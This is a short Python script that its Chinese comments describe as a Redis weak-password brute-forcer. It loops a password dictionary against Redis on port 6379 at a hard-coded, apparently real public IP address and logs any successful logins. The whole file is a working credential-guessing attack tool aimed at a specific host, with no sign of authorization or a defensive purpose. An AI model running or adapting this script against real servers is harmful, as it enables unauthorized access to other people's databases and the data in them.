# -*- coding: utf-8 -*-
# Created by restran on 2016/9/28
from __future__ import unicode_literals, absolute_import

import logging
import os
import sys

import redis
# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.base import TaskExecutor, read_dict

logger = logging.getLogger(__name__)

"""
redis 弱口令爆破
"""

ip_list = ['218.207.183.56']
found_password = []


def weak_pass(password, ip, port=6379):
    try:
        r = redis.StrictRedis(ip, password=password, port=port)
        r.ping()
        logger.info('[True ] %s %s' % (ip, password))
        return True
    except Exception as e:
        if e.message != 'invalid password':
            logger.warning(e)

        logger.info('[False] %s %s' % (ip, password))

    return False


def main():
    password_list = read_dict('password.dic')
    for ip in ip_list:
        executor = TaskExecutor(password_list)
        executor.run(weak_pass, ip)

    for t in found_password:
        logger.info('%s password is %s' % t)


if __name__ == '__main__':
    main()
